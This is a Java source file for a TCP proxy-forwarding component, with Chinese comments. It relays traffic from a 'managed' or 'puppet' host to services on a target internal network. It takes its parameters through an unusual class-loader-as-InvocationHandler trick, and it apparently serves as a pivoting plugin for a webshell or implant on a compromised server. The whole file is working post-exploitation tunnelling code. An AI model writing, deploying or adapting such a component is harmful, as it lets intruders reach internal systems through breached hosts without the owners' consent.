package org.leo.core.component;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

/**
 * 代理转发组件
 * 在被管理端发起到目标内网服务的 TCP 连接，并提供 open/write/read/close 操作
 */
public class ProxyForwardComponent implements Runnable {

    // 操作类型常量
    private static final int OP_OPEN = 0;
    private static final int OP_WRITE = 1;
    private static final int OP_READ = 2;
    private static final int OP_CLOSE = 3;

    // 缓冲区大小
    private static final int BUFFER_SIZE = 65536;
    // idle 超时（10 分钟）
    private static final long IDLE_TIMEOUT_MS = 10L * 60L * 1000L;

    private HashMap params;
    private HashMap results;
    private static Map connMap = new ConcurrentHashMap();
    // connId -> lastActivityMillis
    private static Map connLastActivity = new ConcurrentHashMap();
   

    @Override

    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }


 
    public void invoke() throws IOException, NoSuchFieldException, IllegalAccessException {
        int op = ((Number) params.get("op")).intValue();
        String connId = (String) params.get("connId");
        
        if (op == OP_OPEN) {
            handleOpen(connId);
            return;
        }
        SocketChannel socketChannel = (SocketChannel) connMap.get(connId);
        if (socketChannel == null) {
            results.put("code", 404);
            results.put("msg", "connection not found");
            return;
        }

        if (op == OP_WRITE) {
            handleWrite(socketChannel, connId);
        } else if (op == OP_READ) {
            handleRead(socketChannel, connId);
        } else if (op == OP_CLOSE) {
            handleClose(socketChannel, connId);
        } else {
            results.put("code", 400);
            results.put("msg", "unknown op: " + op);
        }
    }

    /**
     * 处理打开连接操作
     */
    private void handleOpen(String connId)  {
        sweepIdleConns();
        String targetHost = (String) params.get("targetHost");
        int targetPort = ((Number) params.get("targetPort")).intValue();
        try {
            SocketChannel socketChannel = SocketChannel.open();
            socketChannel.connect(new InetSocketAddress(targetHost, targetPort));
            socketChannel.configureBlocking(false);
            connMap.put(connId, socketChannel);
            connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            results.put("code", 200);
            results.put("msg", "opened");
        } catch (IOException e) {
            results.put("code", 404);
            results.put("msg", "建立连接失败");
        }
    }

    /**
     * 处理写入数据操作。
     * 非阻塞 channel 单次 write 可能写不完，必须循环；
     * 加总超时保护，防止对端慢/卡死时占用 puppet 请求处理线程。
     */
    private void handleWrite(SocketChannel socketChannel, String connId) throws IOException {
        Object dataObj = params.get("data");
        byte[] data = (byte[]) dataObj;
        if (data == null) data = new byte[0];
        ByteBuffer buf = ByteBuffer.wrap(data);
        long deadline = System.currentTimeMillis() + 5000L;
        int written = 0;
        while (buf.hasRemaining()) {
            int n = socketChannel.write(buf);
            if (n > 0) {
                written += n;
                connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
                continue;
            }
            if (System.currentTimeMillis() > deadline) {
                results.put("code", 500);
                results.put("msg", "write timeout");
                results.put("bytesWritten", written);
                return;
            }
            try { Thread.sleep(1); } catch (InterruptedException ignored) {}
        }
        results.put("code", 200);
        results.put("bytesWritten", written);
    }

    /**
     * 处理读取数据操作
     */
    private void handleRead(SocketChannel socketChannel, String connId) throws IOException {
        ByteBuffer buf = ByteBuffer.allocate(BUFFER_SIZE);
        int len = socketChannel.read(buf);
        if (len > 0) {
            buf.flip();
            byte[] data = new byte[buf.remaining()];
            buf.get(data);
            connLastActivity.put(connId, Long.valueOf(System.currentTimeMillis()));
            results.put("code", 200);
            results.put("bytesRead", data.length);
            results.put("data", data);
        } else if (len == 0) {
            // 非阻塞模式下没有数据
            results.put("code", 204);
            results.put("bytesRead", 0);
            results.put("data", new byte[0]);
        } else if (len == -1) {
            // 对端关闭
            socketChannel.socket().close();
            connMap.remove(connId);
            connLastActivity.remove(connId);
            results.put("code", 404);
        }
    }

    /**
     * 处理关闭连接操作
     */
    private void handleClose(SocketChannel socketChannel, String connId) throws IOException {
        socketChannel.socket().close();
        connMap.remove(connId);
        connLastActivity.remove(connId);
        results.put("code", 200);
    }

    /**
     * 清理超过 IDLE_TIMEOUT_MS 无活动的连接，在 OPEN 时触发。
     */
    private static void sweepIdleConns() {
        long now = System.currentTimeMillis();
        java.util.Iterator it = connLastActivity.entrySet().iterator();
        while (it.hasNext()) {
            java.util.Map.Entry e = (java.util.Map.Entry) it.next();
            long last = ((Long) e.getValue()).longValue();
            if (now - last > IDLE_TIMEOUT_MS) {
                String connId = (String) e.getKey();
                SocketChannel sc = (SocketChannel) connMap.remove(connId);
                it.remove();
                if (sc != null) {
                    try { sc.socket().close(); } catch (IOException ignored) {}
                }
            }
        }
    }
}


